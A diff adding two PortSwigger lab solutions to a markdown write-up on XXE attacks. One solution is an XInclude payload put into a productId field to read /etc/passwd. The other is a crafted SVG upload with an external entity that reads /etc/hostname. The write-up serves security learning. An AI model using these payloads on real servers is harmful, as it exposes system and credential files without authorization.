@@ -161,3 +161,36 @@ The lab contains a link to an exploit server on a different domain where you can
 ![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/d0839d65-60d6-436c-aa60-711ccab79fdd)
 
 * We got the `passwd` file and lab is solved.
+
+## Lab 7: Exploiting XInclude to retrieve files
+
+This lab has a "Check stock" feature that embeds the user input inside a server-side XML document that is subsequently parsed.
+
+Because you don't control the entire XML document you can't define a DTD to launch a classic XXE attack.
+
+To solve the lab, inject an XInclude statement to retrieve the contents of the /etc/passwd file.
+
+### Sol :
+
+* Click `check stock` and intercept the request.
+* Change the `productId` to the below payload
+
+      <foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
+
+![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/67e19c3b-6fcf-4a7b-96d4-e231842ee97d)
+
+* We got the `passwd` file and lab is solved.
+
+## Lab 8: Exploiting XXE via image file upload
+
+This lab lets users attach avatars to comments and uses the Apache Batik library to process avatar image files.
+
+To solve the lab, upload an image that displays the contents of the /etc/hostname file after processing. Then use the "Submit solution" button to submit the value of the server hostname.
+
+### Sol :
+
+* Create a local SVG image with the following content:
+
+      <?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
+
+* Save it with .svg and upload it as avatar in the comment box.
